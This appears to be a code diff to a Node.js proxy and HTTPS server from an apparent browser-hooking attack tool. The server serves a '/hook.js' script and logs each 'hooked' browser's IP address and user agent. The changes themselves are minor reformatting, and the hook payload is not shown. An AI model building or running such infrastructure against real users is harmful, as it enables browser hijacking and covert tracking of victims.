@@ -39,7 +39,7 @@ http.createServer(function (req, res) {
     if (config.proxy_allowed_ips.indexOf(client_ipaddr) === -1) {
         console.log(`[+] Denied client ${client_ipaddr} to connect to proxy`);
         res.writeHead(403);
-		res.end();
+	    res.end();
         return;
     }
 
@@ -82,10 +82,8 @@ const https_options = {
 https.createServer(https_options, function (req, res) {
     /* Serves the hook file */
     if (req.url == '/hook.js') {
-        //fs.readFile('./hook.js', function (err, data) {
-            res.writeHead(200, {"Content-Type": "application/javascript"});
-            res.end(hook_file);
-        //});
+        res.writeHead(200, {"Content-Type": "application/javascript"});
+        res.end(hook_file);
         var hooked_ipaddr = req.connection.remoteAddress;
         var hooked_useragent = req.headers['user-agent']; 
         console.log("[+] Hooked new browser [" + hooked_ipaddr + "] [" + hooked_useragent + "]");
